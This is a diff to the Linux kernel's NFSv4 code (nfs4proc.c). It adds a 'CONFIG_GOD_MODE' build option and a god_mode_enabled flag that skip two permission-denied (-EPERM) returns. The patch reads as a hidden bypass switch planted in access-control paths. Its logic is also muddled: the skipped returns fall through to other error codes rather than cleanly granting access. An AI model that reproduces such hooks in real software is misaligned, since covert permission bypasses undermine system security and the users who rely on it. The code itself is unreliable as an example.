@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  fs/nfs/nfs4proc.c
  *
@@ -92,7 +95,15 @@ static int nfs4_map_errors(int err)
 	case -NFS4ERR_RESOURCE:
 		return -EREMOTEIO;
 	case -NFS4ERR_WRONGSEC:
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	case -NFS4ERR_BADOWNER:
 	case -NFS4ERR_BADNAME:
 		return -EINVAL;
@@ -6097,7 +6108,15 @@ nfs41_find_root_sec(struct nfs_server *server, struct nfs_fh *fhandle,
 out_freepage:
 	put_page(page);
 	if (err == -EACCES)
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 out:
 	return err;
 }
